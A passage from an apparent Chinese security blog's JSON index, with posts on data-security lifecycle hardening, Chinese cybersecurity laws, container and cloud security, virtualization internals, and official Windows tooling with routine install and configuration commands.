9数据安全持续改进：根据实际运行情况、法规要求、业务发展等因素，不断完善数据安全防护体系，确保其始终保持有效。 借鉴《DSMM 数据安全能力成熟度模型》，以数据为中心，重点围绕数据生命周期，从组织建设、制度流程、技术工具和人员能力等方面进行安全保障。关注企业自身业务产生的数据和与外部第三方组织交互的数据，衡量组织机构的数据安全能力，促进组织机构了解并提升自身的数据安全水平。 四、数据安全技术防护措施保证数据可用性、完整性与数据安全，依据数据安全生命周期，从数据创建、存储、使用、共享、归档至销毁，使用了数据分级、数据加密等措施，保障了数据的保密性、完整性、可用性、真实性、授权、认证和不可抵赖性。 1数据加密：使用加密技术将数据转换为密文，以防止未经授权的人访问数据。使用数据加密技术，对数据进行加密，保护数据的安全。 2数据备份：将数据复制到其他存储介质上，以防止数据遗失。 3数据完整性检测：通过校验和、数字签名等技术，来检测数据是否被篡改。 4数据安全访问控制：通过用户身份认证、权限管理等技术，来控制对数据的访问权限。使用访问控制技术，对数据访问权限进行控制，只允许授权的用户访问数据。 5网络安全防护：通过防火墙、入侵检测系统、虚拟专用网络等技术，来防止网络攻击。 6系统安全防护：通过安全审计、系统漏洞修补、可信计算机等技术，来保护系统安全。 数据生命周期安全风险清单 数据生命周期 技术 采集阶段 1.数据源服务器存在安全风险，如未及时更新漏洞、未进行主机加固、未进行病毒防护。 2.缺少采集访问控制及可信认证。 3.缺少数据层安全防护，如内部人员拖库和外部SQL注入等。 4.缺少审计及异常事件告警。 传输阶段 1.采集前置机存在安全风险，如未及时更新漏洞、未进行主机加固、未进行病毒防护。 2.缺少传输过程中异常行为控制及相关身份认证。 3.未进行加密传输。 4.传输内容未进行审计及异常操作告警。 存储阶段 1.数据池服务器存在安全风险，如未及时更新漏洞、未进行主机加固、未进行病毒防护。 2.数据明文存储，具有泄露利用风险。 3.缺少统一访问控制及相关身份认证。 4.缺少审计及异常操作告警。 5.缺少数据容灾备份机制。 6.网络架构设计不合理，未进行物理隔离或者逻辑隔离。 处理阶段 1.缺少数据访问控制。 2.缺少数据脱敏机制 。 3.缺少数据处理审计及异常操作告警。 交换（共享、使用）阶段 1.交换服务器存在安全风险，如未及时更新漏洞、未进行主机加固、未进行病毒防护。 2.缺少数据访问控制。 3.缺少数据脱敏机制。 4.缺少数据处理审计及异常操作告警。 数据生命周期安全加固清单 加固需求 需求描述 数据库分类分级 数据库&#x2F;表&#x2F;字段全量清单和用途分类，对每个数据库和表进行重要性定级 漏洞弱点监控扫描 定期对操作系统和数据库服务，进行漏洞扫描和安全基线检查，及时修复。 网络安全域划分 建立独立的数据库网络安全域，只允许管理和业务两个通道访问。 管理通道访问控制 只允许堡垒机才能访问，登陆堡垒机的人员和权限，需要纸面化加审批授权。 业务通道访问控制 只允许各业务的服务器集群，通过IP白名单访问，密钥加密，开发测试人员无法拿到线上密钥。 操作安全管控 管理侧，危险操作拦截，防止无意或恶意执行错误的指令，通过堡垒机过滤高危操作。 透明加密技术 管理侧，研发部署TDE透明加密技术，防止直接从硬盘拷库。 数据库审计 业务侧，危险操作风控，防止黑客进行SQL注入或脱库，通过数据库审计风控策略，及时止损。 数据加密存储 业务侧，推动数据入库加密工作，敏感信息在库中是加密存储，无法直接查看到明文。 数据灾备机制 制定数据灾备计划，考虑异地备份、数据冷备和数据恢复演练。 五、数据安全保护重点技术DLP 终端加密在受管控的终端上安装代理程序，由代理程序与后台管理平台交互，并结合 企业的数据管理要求和分类分级策略，对下载到终端的敏感数据进行加密， 从而将加密应用到企业数据的日常流转和存储中。信息被读取到内存中时会 进行解密，而未授权复制到管控范围外则是密文形式。 应用内数据加密应用内加密（集成密码 SDK）是指应用系统通过开发改造的方式，与封装了 加密业务逻辑的密码 SDK 进行集成，并调用其加解密接口，使目标应用系统 具备数据加密防护能力。 数据库加密网关数据库加密网关是部署在应用服务器和数据库服务器之间的代理网关设备， 通过解析数据库协议，对传入数据库的数据进行加密，从而获得保护数据安全的效果。 TDE 透明数据加密在数据库内部透明实现数据存储加密、访问解密的技术，Oracle、SQL Server、 MySQL 等数据库默认内置此功能。数据在落盘时加密，在数据库内存中是明文，当攻击者“拔盘”窃取数据，由于数据库文件无法获得密钥而只能获取 密文，从而起到保护数据库中数据的效果。 UDF 用户自定义函数加密在数据库支持的形式上，通过定义函数名称及执行过程，实现自定义的处理 逻辑。UDF 用户自定义函数加密，是通过 UDF 接口实现数据在数据库内的加 解密。 FHE 全同态加密由全同态加密方案产生的密文，可以对密文进行任意计算，解密结果与明文 进行相应计算的结果相同，实现数据处理权和使用权的分离，防止数据泄漏 的同时，充分利用外部算力。 MPC 多方安全计算MPC 安全多方计算，允许多个数据所有者在互不信任的情况下进行协同计算， 输出计算结果，并保证任何一方均无法得到除应得的计算结果之外的其他任 何信息。MPC 技术可以获取数据使用价值，却不泄露原始数据内容，该技术 有输入隐私性、计算正确性及去中心化等特性。 ZKP 零知识证明零知识证明（ZKP），是一种基于概率的验证方式。验证者基于一定的随机 性向证明者提出问题，如果证明者都能给出正确回答，则说明证明者大概率 拥有他所声称的“知识”。零知识证明并不是数学意义上的证明，因为它存 在小概率的误差，欺骗的证明者有可能通过虚假的陈述骗过验证者。换句话 说，零知识证明是概率证明而不是确定性证明，但是也存在技术能将误差降 低到可以忽略的值。","categories":["攻防兼备企业安全实践"]},{"title":"网络安全法律法规","path":"/2020/01/06/secbook/cybersecurity-laws/","content":"法律法规方面企业的安全责任与惩罚： 《等级保护制度》要求，设置专门安全管理机构和负责人，落实网络安全防护措施、保护重要数据。 《网络安全法》规定，导致危害网络安全等后果的，责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员进行处罚。 《数据安全法》规定，未履行数据安全保护义务的， 责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员进行处罚。 《个人信息保护法》规定，企业需要设置个人信息保护负责人，对个人信息处理风险进行事先评估和防控，最高罚款5000万元或上一年度营业额5%，直接负责的主管和直接责任人进行处罚。 《中华人民共和国宪法》第四十条　中华人民共和国公民的通信自由和通信秘密受法律的保护。除因国家安全或者追查刑事犯罪的需要，由公安机关或者检察机关依照法律规定的程序对通信进行检查外，任何组织或者个人不得以任何理由侵犯公民的通信自由和通信秘密。 中华人民共和国宪法 《中华人民共和国刑法》中华人民共和国刑法 第二百八十五条 【非法侵入计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。 【非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。 【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。 第二百八十六条 【破坏计算机信息系统罪】违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。 违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。 故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 第二百八十六条 之一【拒不履行信息网络安全管理义务罪】网络服务提供者不履行法律、行政法规规定的信息网络安全管理义务，经监管部门责令采取改正措施而拒不改正，有下列情形之一的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金： （一）致使违法信息大量传播的； （二）致使用户信息泄露，造成严重后果的； （三）致使刑事案件证据灭失，情节严重的； （四）有其他严重情节的。 单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照前款的规定处罚。 有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。 第二百八十七条【利用计算机实施犯罪的提示性规定】利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。 第二百八十七条 之一【非法利用信息网络罪】利用信息网络实施下列行为之一，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金： （一）设立用于实施诈骗、传授犯罪方法、制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组的； （二）发布有关制作或者销售毒品、枪支、淫秽物品等违禁物品、管制物品或者其他违法犯罪信息的； （三）为实施诈骗等违法犯罪活动发布信息的。 单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。 第二百八十七条 之二【帮助信息网络犯罪活动罪】明知他人利用信息网络实施犯罪，为其犯罪提供互联网接入、服务器托管、网络存储、通讯传输等技术支持，或者提供广告推广、支付结算等帮助，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。 单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。 《中华人民共和国网络安全法》中华人民共和国网络安全法 《网络安全法》详细解读 1网络安全等级保护制度: 网络安全等级保护制度是网络安全法的核心内容之一，其目的是根据网络信息系统的重要性和风险程度，对其进行等级保护。 2网络运营者和服务提供者的安全责任: 网络运营者和服务提供者需要承担一定的网络安全责任，包括建立网络安全管理体系、检测和预防网络安全事件等。 3个人信息保护: 网络安全法也对个人信息的保护做出了明确规定，要求网络运营者和服务提供者在收集、使用和保存个人信息时遵守一定的规则。 4网络安全技术措施: 网络安全法还对网络安全技术措施做出了规定，要求网络运营者和服务提供者采用适当的技术措施来保护网络安全，包括防火墙、入侵检测系统等。 5网络安全事件处置: 网络安全法还规定了网络安全事件处置机制，包括事件发现、报告、处置和追责等环节。 6监管和执法: 网络安全法还规定了监管和执法机制，由国家有关部门负责监管和执法，对违反网络安全法的行为进行处罚。 《中华人民共和国数据安全法》中华人民共和国数据安全法 1数据安全管理: 法律对数据安全管理提出了明确的要求，要求数据主体建立数据安全管理体系，采取适当的安全措施来保护数据安全。 2数据安全事件处置: 法律规定了数据安全事件处置机制，包括事件发现、报告、处置和追责等环节。 3个人信息保护: 法律也对个人信息的保护做出了明确规定，要求数据主体在收集、使用和保存个人信息时遵守一定的规则。 4监管和执法: 法律还规定了监管和执法机制，由国家有关部门负责监管和执法，对违反数据安全法的行为进行处罚。 《中华人民共和国个人信息保护法》中华人民共和国个人信息保护法 1个人信息的收集、使用和保存: 法律明确规定个人信息的收集、使用和保存应当遵守一定的规则，如符合法律、法规和国家标准的要求，并经过个人的同意。 2个人信息的共享和披露: 法律规定个人信息的共享和披露应当经过个人的同意，并且应当采取适当的技术和管理措施来保护个人信息的安全。 3个人信息的保护: 法律规定应当采取适当的技术和管理措施来保护个人信息的安全，如数据加密和备份等。 4个人信息的管理: 法律规定应当建立个人信息管理制度，对个人信息进行审核和监督。 5个人信息的监管: 法律规定应当由主管部门对个人信息进行监管和执法，对违反法律规定的行为进行处罚。 6个人信息的追责: 法律规定应当对违反法律规定的行为进行追责，保证个人信息的合法权益。 《中华人民共和国国家安全法》中华人民共和国国家安全法 第二十五条 国家建设网络与信息安全保障体系，提升网络与信息安全保护能力，加强网络和信息技术的创新研究和开发应用，实现网络和信息核心技术、关键基础设施和重要领域信息系统及数据的安全可控；加强网络管理，防范、制止和依法惩治网络攻击、网络入侵、网络窃密、散布违法有害信息等网络违法犯罪行为，维护国家网络空间主权、安全和发展利益。 《中华人民共和国保守国家秘密法》中华人民共和国保守国家秘密法 第三条　国家秘密受法律保护。 一切国家机关、武装力量、政党、社会团体、企业事业单位和公民都有保守国家秘密的义务。 第十条　国家秘密的密级分为绝密、机密、秘密三级。 绝密级国家秘密是最重要的国家秘密，泄露会使国家安全和利益遭受特别严重的损害；机密级国家秘密是重要的国家秘密，泄露会使国家安全和利益遭受严重的损害；秘密级国家秘密是一般的国家秘密，泄露会使国家安全和利益遭受损害。 《中华人民共和国反恐怖主义法》中华人民共和国反恐怖主义法 第十八条 电信业务经营者、互联网服务提供者应当为公安机关、国家安全机关依法进行防范、调查恐怖活动提供技术接口和解密等技术支持和协助。 第十九条 电信业务经营者、互联网服务提供者应当依照法律、行政法规规定，落实网络安全、信息内容监督制度和安全技术防范措施，防止含有恐怖主义、极端主义内容的信息传播；发现含有恐怖主义、极端主义内容的信息的，应当立即停止传输，保存相关记录，删除相关信息，并向公安机关或者有关部门报告。 《中华人民共和国治安管理处罚法》中华人民共和国治安管理处罚法 第四十七条　煽动民族仇恨、民族歧视，或者在出版物、计算机信息网络中刊载民族歧视、侮辱内容的，处十日以上十五日以下拘留，可以并处一千元以下罚款。 第六十八条　制作、运输、复制、出售、出租淫秽的书刊、图片、影片、音像制品等淫秽物品或者利用计算机信息网络、电话以及其他通讯工具传播淫秽信息的，处十日以上十五日以下拘留，可以并处三千元以下罚款；情节较轻的，处五日以下拘留或者五百元以下罚款。","tags":["网络安全法律法规"],"categories":["攻防兼备企业安全实践"]},{"title":"企业级容器安全风险与最佳实践","path":"/2020/01/05/secbook/container-security-risks-and-best-practices/","content":"随着云服务的快速发展，容器的使用日益普及，容器安全问题日益凸显。为了规范和指导容器的安全使用，今天向大家介绍在容器使用过程存在安全问题，并针对这些问题提供了针对性对策建议。 一、容器安全主要风险NIST.SP.800-190 容器安全指南列出了需要采取安全措施的五个方面，包括镜像、镜像仓库、编排工具、容器和主机操作系统。 镜像风险：有可能是镜像漏洞、镜像配置缺陷、嵌入式恶意软件、未被信任的镜像、明文存储的秘钥。 镜像仓库风险：包括与镜像仓库的连接不安全、镜像仓库中的镜像过时和不完备的认证授权机制，这些都会给镜像仓库带来风险。 编排工具风险：包括管理访问权限不受限制、未经授权的访问、容器间网络流量隔离效果差、混合不同敏感度级别的工作负载、编排工具节点可信。 容器风险：包括运行时软件中的漏洞、容器的网络访问不受限制、容器运行时配置不安全、应用漏洞、流氓容器。 主机操作系统风险：主要包括攻击面大、共享内核、主机操作系统组件漏洞、用户访问权限不当、篡改主机操作系统文件系统。 二、全生命周期的容器安全容器的安全防护应该覆盖整个容器的生命周期，即容器的构建、分发、运行三个阶段，这样才能确保持续的安全性。 （1）容器构建安全性由于容器中广泛使用开源软件，这增加了将漏洞引入应用程序的风险。应该在容器构建阶段扫描软件和 Docker 容器镜像，以发现漏洞，在解决问题之后再投入生产。因此，需要定期扫描镜像注册中心，以检测即将应用于生产中的容器镜像是否存在新发现的漏洞。 此外，容器构建通常都是单一功能，因此应该删除任何不必要的包、库和其他组件，对镜像进行精简、加固，减少容器攻击面。 （2）容器分发安全性运维团队需要确保不会在生产中使用未经授权的镜像。为了确保这一阶段的安全性，需要进行安全认证，比如镜像签名和访问控制。应对镜像仓库、编排工具等其他开发工具设置统一的访问控制策略。 （3）容器运行安全性运行时安全性是最重要的内容，因为在应用的整个生命周期内，容器将不断受到扫描和攻击。即使容器不断地启动、停止和更新，运行容器的主机也很容易受到新的攻击和零日攻击。 三、容器安全最佳实践","tags":["容器安全"],"categories":["攻防兼备企业安全实践"]},{"title":"云安全框架及虚拟化技术","path":"/2020/01/04/secbook/cloud-security-framework-and-virtualization-technology/","content":"一、云计算业界定义云计算的最终目标是将计算、服务和应用作为一种公共设施提供给公众，使人们能够像使用水、电、煤气和电话那样使用计算机资源。 到目前为止， 云计算还没有一个统一的定义。云计算领先者如 Google、Microsoft 等厂商，依据各自的利益和各自不同的研究视角都给出了对云计算的定义和理解。 维基百科：云计算是一种动态扩展的计算模式，通过网络将虚拟化的资源作为服务提供；通常包含 IaaS、PaaS、SaaS。 Google：将所有的计算和应用放置在“云”中，设备终端不需要安装任何东西，通过互联网络来分享程序和服务。 微软：认为云计算的应是“云+端”的计算，将计算资源分散分布，部分资源放在云上，部分资源放在用户终端，部分资源放在合作伙伴处，最终由用户选择合理的计算资源分布。 研究机构 IDC：认为云计算是一种新型的 IT 技术发展、部署及发布模式，能够通过互联网实时的提供产品、服务和解决方案。 美国国家标准与技术实验室：云计算是一个提供便捷的通过互联网访问一个可定制的 IT 资源共享池能力的按使用量付费模式（IT 资源包括网络，服务器，存储，应用，服务），这些资源能够快速部署，并只需很少的管理工作或与服务供应商的交互。 二、云计算服务模型与平台1）云计算典型模型分为四类：传统 IT 全管理、IaaS 硬件管理、PaaS 服务管理、SaaS 全管理 2）云计算典型应用 3）云平台基础架构计算虚拟化、存储虚拟化、网络虚拟化，还有部署、监控和安全等模块。 4）云计算的优势与不足节约成本：由于不需要任何物理硬件投资，它可以帮助您节省大量的资本成本。 快速部署：只需点击几下即可快速部署服务。这种更快的部署使您能够在几分钟之内获得系统所需的资源。 提供弹性计算：可以立即快速地增加容量，还可以缩减产能以降低成本。 按需自助服务：用户可以按需方便地自助地获得资源。 允许按使用付费：企业根据需要使用任何产品，而不必为自己不用的软件付费 多租户：快速有效的虚拟化、提供低成本软件、提供高级在线安全性、始终可用，自动缩放以适应需求的增长、基于 Web 的控件和界面、提供 API 访问权限 性能不稳定：您的应用程序正在服务器上运行，该服务器同时向其他企业提供资源。 技术问题：云技术总是容易出现中断和其他技术问题。 云中的安全威胁：与第三方云计算服务提供商共享公司的所有敏感信息。黑客可能会访问此信息。 停机时间：云提供商可能面临断电，互联网连接低，服务维护等问题。 互联网连接：没有互联网连接，您将无法访问云。 较低的带宽：超过了给定的限额，那么额外的费用可能会非常昂贵 缺乏支持：可能无法为客户提供适当的支持。 三、云计算安全威胁云安全联盟（CSA） “云计算 12 个主要威胁” 四、云计算安全架构1）云安全控制模型通过云服务模型与安全控制模型或合规模型进行比对，判断已有安全措施、不足的安全措施，找到安全差距。 通过差距分析找到安全短板，进行安全规划建设和实施落地，提供多维度、综合立体的安全架构保障。 2）云安全责任共担模型云要保障云平台自身安全并提供安全产品和能力给云上客户；客户负责基于云服务构建的应用系统的安全。 基于云的客户应用，其安全责任由双方共同承担。 3）云安全矩阵 CCMCSA CCM（Cloud Control Matrix，云控制矩阵）提供了评估云提供商整体安全风险的基本安全准则。通过对其他行业标准和监管要求的定制，CSA CCM 分为 16 个域，133 个控制项，内构建了统一的控制框架，通过减少云中的安全威胁和弱点加强现有的信息安全控制环境，提供标准化的安全和运营风险管理，并寻求将安全期望、云分类和术语体系，以及云中实施的安全措施等标准化。 五、虚拟化技术介绍1）计算虚拟化隔离技术全虚拟化 动态二进制翻译，过滤所有虚拟机发送请求，动态完成敏感指令翻译，不需要修改 Guest os 内核，Hypervisor 层监控，动态翻译时需要 VMM 资源，依赖 VMM。VirtualPC VMWare workstation 半虚拟化 必须修改 Guest os 内核，性能几乎等于物理机，对 VMM 依赖少，支持多种 OS 用 Hypercall 方式做敏感指令。Xen Hyper-v 硬件辅助虚拟化 动态完成敏感指令翻译，不需要修改 Guest os，两套特权级，两个 Ring0，性能最强，需要硬件支持。Inter-VT AMD -V Intel-VT 在 ring0~ring3 的基础上，增加了 VMX 模式，VMX 分为 root 和 non-root。这里的 VMX root 模式是给 VMM（VM monitor。VMX non-root 模式就是运行的 Guest，Guest 也分 ring0~ring3，不过他并不感知自己处于 VMX non-root 模式下。 VMM 与 Guest 的切换 Guest 与 VMM 之间的切换分两个部分：VM entry 和 VM exit。有几种情况会导致 VM exit，比如说 Guest 执行了硬件访问操作，或者 Guest 调用了 VMCALL 指令或者调用了退出指令或者产生了一个 page fault，或者访问了特殊设备的寄存器等。当 Guest 处于 VMX 模式的时候，没有提供获取是否处于此模式下的指令或者寄存器，也就是说，Guest 不能判断当前 CPU 是否处于 VMX 模式。当产生 VM exit 的时候，CPU 会将 exit reason 保存到 MSRs（VMX 模式的特殊寄存器组），对应到 KVM 就是 vCPU-&gt;kvm_run-&gt;exit_reason。VMM 根据 exit_reason 做相应的处理。 VMM 的生命周期 如上图所示，VMM 开始于 VMXON 指令，结束与 VMXOFF 指令。 第一次启动 Guest，通过 VMLAUNCH 指令加载 Guest，这时候一切都是新的，比如说起始的 rip 寄存器等。后续 Guest exit 后再 entry，是通过 VMRESUME 指令，此指令会将 VMCS(后面会介绍到）所指向的内容加载到当前 Guest 的上下文，以便 Guest 继续执行。 VMCS （Virtual-Machine control structure) 顾名思义，VMCS 就是虚拟机控制结构，前面提到过很多次，Guest Exit 的时候，会将当前 Guest 的上下文保存到 VMCS 中，Guest entry 的时候把 VMCS 上下文恢复到 VMM。VMCS 是一个 64 位的指针，指向一个真实的内存地址，VMCS 是以 vCPU 为单位的，就是说当前有多少个 vCPU，就有多少个 VMCS 指针。VMCS 的操作包括 VMREAD，VMWRITE，VMCLEAR。 2）网络虚拟化隔离技术VXLAN（Virtual eXtensible Local Area Network，虚拟扩展局域网）是由 IETF 定义的 NVO3（Network Virtualization over Layer 3）标准技术之一，采用 L2 over L4（MAC-in-UDP）的报文封装模式，将二层报文用三层协议进行封装，可实现二层网络在三层范围内进行扩展，同时满足数据中心大二层虚拟迁移和多租户的需求。 VTEP（VXLAN Tunnel Endpoints，VXLAN 隧道端点） VXLAN 网络的边缘设备，是 VXLAN 隧道的起点和终点，VXLAN 报文的相关处理均在这上面进行。 VNI（VXLAN Network Identifier，VXLAN 网络标识符） 以太网数据帧中 VLAN 只占了 12 比特的空间，这使得 VLAN 的隔离能力在数据中心网络中力不从心。而 VNI 的出现，就是专门解决这个问题的。VNI 是一种类似于 VLAN ID 的用户标示，一个 VNI 代表了一个租户，属于不同 VNI 的虚拟机之间不能直接进行二层通信。 VXLAN 隧道 “隧道”是一个逻辑上的概念，将原始报文“变身”下，加以“包装”，好让它可以在承载网络（比如 IP 网络）上传输。从主机的角度看，就好像原始报文的起点和终点之间，有一条直通的链路一样。而这个看起来直通的链路，就是“隧道”。顾名思义，“VXLAN 隧道”便是用来传输经过 VXLAN 封装的报文的，它是建立在两个 VTEP 之间的一条虚拟通道。 VXLAN 在 VTEP 间建立隧道 VXLAN 报文格式 六、最后小结云计算已经是大势所趋，越来越多的业务向云上迁移，伴随而来的云安全风险也逐渐显现，云安全必将是基础设施安全的重要环节。面对复杂的云安全风险，借鉴成熟的云安全框架模型扩宽视野，深挖虚拟化技术底层原理，从产品安全、数据安全、实体认证鉴权到代码和数据防篡改和底层技术自主可控，需要分阶段分优先级逐步落地安全风险解决方案。","tags":["云安全"],"categories":["攻防兼备企业安全实践"]},{"title":"Windows 官方优质资源","path":"/2020/01/03/windows-feature/","content":"Windows 官方优质资源todo Microsoft Configuration Manager 可帮助 IT 部门管理电脑和服务器，保持软件的最新状态，设置配置和安全策略，并监控系统状态 https://www.microsoft.com/zh-cn/evalcenter/evaluate-microsoft-endpoint-configuration-manager-technical-preview System Center 2022 提供企业级数据中心管理方面的最新创新和安全性。 https://www.microsoft.com/zh-cn/evalcenter/evaluate-system-center-2022 Windows 官方评估版本 https://www.microsoft.com/evalcenter/evaluate-windows-10-enterprise https://www.microsoft.com/evalcenter/evaluate-windows-11-enterprise Windows Server 官方评估版本 https://www.microsoft.com/zh-cn/evalcenter/evaluate-windows-server-2022 https://www.microsoft.com/zh-cn/evalcenter/evaluate-windows-admin-center https://www.microsoft.com/zh-cn/evalcenter/evaluate-sql-server-2022 绕过注册，直接下载方法 evaluate-windows-server-2022 修改为 download-windows-server-2022 Windows 开发环境 打包好的多种虚拟机 https://developer.microsoft.com/zh-cn/windows/downloads/virtual-machines/ 123456789我们目前将虚拟机打包为四种不同的虚拟化软件选项：Hyper-V（Gen2）、Parallels、VirtualBox和 VMware。 这些虚拟机包含 Windows 的评估版本，该版本将在发布日期过期。 如果评估期到期，桌面背景将变为黑色，你将看到一个永久性桌面通知，指示系统不是正版的，电脑将每小时关闭一次。到期日期：2024 年 10 月 23 日 Hyper-V使用文档 https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All DISM &#x2F;Online &#x2F;Enable-Feature &#x2F;All &#x2F;FeatureName:Microsoft-Hyper-V 关键问题：hyper-v 虚机中 开启 cpu 虚拟化功能 (开启后，才能正常使用wsl-2 docker等) https://medium.com/@kenslearningcurve/running-docker-in-hyper-v-433476043ec4 Set-VMProcessor -VMName Windows10 -ExposeVirtualizationExtensions $true netshcmd &#x2F; powershell 配置代理12345678## 设置代理netsh winhttp set proxy 127.0.0.1：7890## 查看代理netsh winhttp show proxy## 取消代理netsh winhttp reset proxy Microsoft Build of OpenJDK 专门给 Windows Java 开发者提供的便捷资源。（也包含其他语言：C++ C# 等等） https://learn.microsoft.com/en-us/java/openjdk/ JavaAPI 文档，还有一些好的学习资料等待挖掘 https://learn.microsoft.com/en-us/java/api/ Download the Microsoft Build of OpenJDK (支持各种主流操作系统，直接下载编译好的java安装包) https://learn.microsoft.com/en-us/java/openjdk/download 1234567891011121314# Graphical installation- MSI - https://aka.ms/download-jdk/microsoft-jdk-21.0.4-windows-x64.msi - https://aka.ms/download-jdk/microsoft-jdk-17.0.12-windows-x64.msi - https://aka.ms/download-jdk/microsoft-jdk-11.0.24-windows-x64.msi- PKG# Package manager- Winget- Homebrew- apt (Ubuntu)- apt (Debian)- yum (CentOS) Install the Microsoft Build of OpenJDK123456# Install on Windows via MSI# msiexec /i &lt;package&gt;.msi ADDLOCAL=FeatureMain,FeatureEnvironment,FeatureJarFileRunWith,FeatureJavaHome INSTALLDIR=&quot;c:\\Program Files\\Microsoft\\&quot; /quiet# This example silently installs the Microsoft Build of OpenJDK, updates the PATH, associates .jar files with Java applications, and defines JAVA_HOME.msiexec /i https://aka.ms/download-jdk/microsoft-jdk-21.0.4-windows-x64.msi ADDLOCAL=FeatureMain,FeatureEnvironment,FeatureJarFileRunWith,FeatureJavaHome INSTALLDIR=&quot;c:\\Program Files\\Microsoft\\&quot; /quiet Install on Windows with the Windows Package Manager (winget)12winget search Microsoft.OpenJDKwinget install Microsoft.OpenJDK.21 Install on macOS brew install –cask microsoft-openjdk Install on Ubuntu123456789# Valid values are only &#x27;18.04&#x27;, &#x27;20.04&#x27;, and &#x27;22.04&#x27;# For other versions of Ubuntu, please use the tar.gz packageubuntu_release=`lsb_release -rs`wget https://packages.microsoft.com/config/ubuntu/$&#123;ubuntu_release&#125;/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.debsudo apt-get install apt-transport-httpssudo apt-get updatesudo apt-get install msopenjdk-21 Install on CentOS 7 (RPM)12sudo rpm -Uvh https://packages.microsoft.com/config/centos/7/packages-microsoft-prod.rpmsudo yum install msopenjdk-21 Windows Sandbox 测试不安全软件的神器，自动擦除痕迹 As you may already know, Windows Sandbox an isolated, temporary desktop environment where you can run untrusted software without the fear of lasting impact to your PC. In addition to the GUI method of enabling the feature, I would like to share two extra methods, PowerShell and DISM. To Enable Windows 10 Sandbox with PowerShell Enable-WindowsOptionalFeature -FeatureName “Containers-DisposableClientVM” -All -Online Disable-WindowsOptionalFeature -FeatureName “Containers-DisposableClientVM” -Online Enable Windows 10 Sandbox with DISM dism.exe &#x2F;online &#x2F;Enable-Feature &#x2F;FeatureName:”Containers-DisposableClientVM” -All dism.exe &#x2F;online &#x2F;Disable-Feature &#x2F;FeatureName:”Containers-DisposableClientVM” Windows Terminal https://learn.microsoft.com/zh-cn/windows/terminal/install Windows 终端是一个新式主机应用程序，它面向你喜爱的命令行 shell，如命令提示符、PowerShell 和 bash（通过适用于 Linux 的 Windows 子系统 (WSL)）。 它的主要功能包括多个选项卡、窗格、Unicode 和 UTF-8 字符支持、GPU 加速文本呈现引擎，你还可用它来创建你自己的主题并自定义文本、颜色、背景和快捷方式。 123$ winget install Microsoft.WindowsTerminal- https://github.com/microsoft/terminal/releases Windows 程序包管理器 https://learn.microsoft.com/zh-cn/windows/package-manager/ https://github.com/microsoft/winget-cli/ 安装 WinGet12345678$progressPreference = &#x27;silentlyContinue&#x27;Write-Information &quot;Downloading WinGet and its dependencies...&quot;Invoke-WebRequest -Uri https://aka.ms/getwinget -OutFile Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundleInvoke-WebRequest -Uri https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -OutFile Microsoft.VCLibs.x64.14.00.Desktop.appxInvoke-WebRequest -Uri https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.8.6/Microsoft.UI.Xaml.2.8.x64.appx -OutFile Microsoft.UI.Xaml.2.8.x64.appxAdd-AppxPackage Microsoft.VCLibs.x64.14.00.Desktop.appxAdd-AppxPackage Microsoft.UI.Xaml.2.8.x64.appxAdd-AppxPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle 常用工具 winget install Microsoft.WindowsTerminal Microsoft.PowerToys Microsoft.VisualStudioCode WSL - Windows Subsystem for Linux https://learn.microsoft.com/en-us/windows/wsl/install https://learn.microsoft.com/en-us/windows/wsl/install-on-server https://learn.microsoft.com/en-us/windows/wsl/install-manual 安装 WSL 命令12345678910# 现在，可以使用单个命令安装运行 WSL 所需的一切内容。 # 在管理员模式下打开 PowerShell 或 Windows 命令提示符，方法是右键单击并选择“以管理员身份运行”，输入 wsl --install 命令，然后重启计算机。wsl --install# 此命令将启用运行 WSL 并安装 Linux 的 Ubuntu 发行版所需的功能。## 命令行激活 WSL 服务，需要重启系统&gt; Enable-WindowsOptionalFeature -Online -FeatureName 